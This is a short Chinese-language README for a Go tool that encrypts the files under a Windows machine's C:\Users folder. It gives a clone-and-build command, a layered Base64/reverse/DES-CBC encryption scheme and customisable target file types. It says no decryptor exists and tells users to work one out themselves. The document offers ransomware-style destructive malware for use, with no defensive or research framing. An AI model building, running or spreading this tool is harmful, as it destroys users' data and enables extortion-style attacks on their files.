# 谨慎运行目前只对C:\Users目录加密
## 使用
git clone https://github.com/RuanLang0777/Smallfat.git && cd Smallfat && go build
## 自定义加密文件
![The file type](https://user-images.githubusercontent.com/53397197/170865066-9b03c382-f8db-4d83-aee6-cfee2746005c.png)
## 加密流程
Base64编码->反转->Base64编码->DES(CBC,PKCS5Padding)
## 为什么没有解密程序
懒(加密顺序都有了，自己解密去!)

